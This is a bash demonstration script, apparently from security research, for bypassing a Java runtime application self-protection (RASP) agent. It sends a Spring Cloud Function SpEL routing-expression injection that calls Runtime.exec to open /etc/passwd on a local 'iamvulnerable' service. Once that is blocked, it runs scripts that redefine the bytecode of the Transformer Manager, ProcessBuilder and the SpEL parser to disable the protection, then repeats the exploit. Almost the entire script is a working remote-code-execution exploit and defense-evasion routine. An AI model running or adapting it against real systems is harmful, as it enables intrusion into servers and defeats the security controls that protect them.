#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${RED}----Bypassing RASP using Library Injection 😈-----------${NC}"

sleep 3
echo -e "${GREEN}Trying Exploit...${NC}"
echo -e "${YELLOW}curl  -X POST http://localhost:8080/iamvulnerable  -H \"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')\""
curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')"
echo -e "\n"
sleep 6
echo -e "${RED} We are blocked 😠${NC}"
echo -e "\n"
sleep 7

# Redefine Transformer Manager
echo -e "${GREEN}Redefining Transformer Manager bytecode..${NC}"
./redefine_transformer_manager.sh
sleep 7
echo -e "\n"

# Redefine ProcessBuilder
echo -e "${GREEN}Redefining ProcessBuilder bytecode..${NC}"
./redefine_process_builder.sh
sleep 5
echo -e "\n"

# Redefine Spring EL parser
echo -e "${GREEN}Redefining Spring EL parser bytecode..${NC}"
./redefine_spel_parser.sh
sleep 5
echo -e "\n"

# Redefine Spring EL parser
echo -e "${RED}Now exploit should pass...${NC}"
echo -e "${YELLOW}curl  -X POST http://localhost:8080/iamvulnerable  -H \"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')\""
curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')"
echo -e "\n"
sleep 1
